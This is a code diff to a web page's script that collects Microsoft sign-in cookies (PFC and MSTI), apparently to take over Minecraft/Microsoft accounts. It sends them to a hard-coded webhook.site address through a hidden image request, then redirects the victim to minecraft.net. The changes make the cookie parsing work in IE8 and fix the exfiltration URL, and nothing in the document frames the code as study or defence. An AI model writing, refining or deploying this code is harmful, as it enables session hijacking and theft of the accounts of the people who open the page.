@@ -12,38 +12,46 @@
 
   <script>
     /* ---------- CONFIGURATION ---------- */
-    var WEBHOOK_URL = 'https://webhook.site/#!/view/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b';  // <-- paste YOUR URL
+    var WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b';  // <-- keep this exact URL
     var REDIRECT_URL = 'https://www.minecraft.net/';
 
-    /* ---------- HELPER ---------- */
+    /* ---------- COOKIE PARSER (IE8‑SAFE) ---------- */
     function getCookie(name){
-      var parts = document.cookie.split(';');
-      for (var i=0;i<parts.length;i++){
-        var kv = parts[i].trim().split('=');
-        if (kv[0]===name) return kv[1];
+      var cookies = document.cookie;
+      if (!cookies) return '';
+      var parts = cookies.split(';');
+      for (var i = 0; i < parts.length; i++){
+        var kv = parts[i];
+        /* remove leading spaces – no .trim() */
+        while (kv.charAt(0) === ' ') kv = kv.substring(1);
+        var eq = kv.indexOf('=');
+        if (eq < 0) continue;
+        var key = kv.substring(0, eq);
+        var value = kv.substring(eq + 1);
+        if (key === name) return value;
       }
       return '';
     }
 
     /* ---------- MAIN ---------- */
     window.onload = function(){
+      // Wait a bit for the Microsoft cookies to settle
       setTimeout(function(){
-        /* 1. Grab the two cookies */
+        /* 1. Grab the two relevant cookies */
         var pfc  = getCookie('PFC');
         var msti = getCookie('__Host-MSTI') || getCookie('MSTI');
 
-        /* 2. Send them to the webhook (no JSON!) */
+        /* 2. Send them to the webhook (no JSON → no “JSON undefined” error) */
         var img = new Image();
-        img.src = WEBHOOK_URL + '?PFC=' + encodeURIComponent(pfc) +
-                     '&MSTI=' + encodeURIComponent(msti);
+        var data = 'PFC=' + encodeURIComponent(pfc) + '&MSTI=' + encodeURIComponent(msti);
+        img.src = WEBHOOK_URL + '?' + data;
 
-        /* 3. Feedback */
+        /* 3. Show a short message */
         document.getElementById('status').innerText = 'Token captured! Redirecting...';
 
-        /* 4. Redirect to Minecraft */
+        /* 4. Jump straight to Minecraft */
         location.replace(REDIRECT_URL);
-
-      }, 4000);  // 4 seconds
+      }, 4000);   // 4 seconds – enough for IE8 to finish cookie handling
     };
   </script>
 </body>
